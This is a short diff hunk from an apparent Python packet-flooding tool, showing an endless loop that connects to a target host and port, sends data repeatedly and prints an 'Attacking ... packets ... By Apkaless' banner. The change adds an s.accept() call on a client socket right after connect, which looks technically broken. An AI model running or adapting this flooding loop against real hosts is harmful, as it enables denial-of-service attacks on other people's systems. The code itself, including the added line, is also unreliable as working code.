@@ -110,6 +110,7 @@ try:
           time.sleep(5)
           while True:
                s.connect((host,port))
+               s.accept()
                s.sendto(bytes, (host,port))
                sent = sent + 1
                print(Fore.GREEN + Style.NORMAL + "Attacking %s packets to %s on port %s By Apkaless" %(sent,host,port))
